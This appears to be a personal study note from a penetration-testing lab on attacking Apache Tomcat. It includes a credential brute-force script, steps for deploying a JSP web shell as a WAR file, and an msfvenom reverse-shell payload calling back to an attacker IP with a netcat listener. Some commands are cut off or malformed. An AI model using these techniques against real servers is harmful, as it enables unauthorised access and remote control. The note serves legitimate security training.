[here](https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)[Apache Tomcat](https://tomcat.apache.org/)

# Enumeration Steps
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```
##### Structure
```bash
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

##### The folders
In the `Bin` folder you will find the binaries of the webpage.
The `conf` will have the configuration files of the page.
`tomcat-users.xml` will have the user and assigned roles/credentials

```bash
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```
The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor.

# Deeper Enumeration
```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

# Exercise 1
Finding the version
`curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat` near the top of the output

# Attacking Tomcat
We can use `https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/`
```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

If wanting to use things like `burp`
`set PROXIES HTTP:127.0.0.1:8080`
Checking the authorization header in raw you can see base64 encoded creds.
```python

```#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```
Running it
`python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-`

### Uploading a WAR file
Going to `http://web01.inlanefreight.local:8180/manager/html`
[Upload File](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
Then using
`wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp Lazarus2858@htb[/htb]$ zip -r backup.war cmd.jsp`
Then click browse and select the `.war` file the `Deploy`.

Then a `/backup` directory will be added.
Going to `http://web01.inlanefreight.local:8180/backup/cmd.jsp`
Or
`curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id`

##### MSFvenom Way
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`

`nc -lnvp 4443`
Then execute by clicking on `/backup`

##### GhostCat
[Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938)

[POC](https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
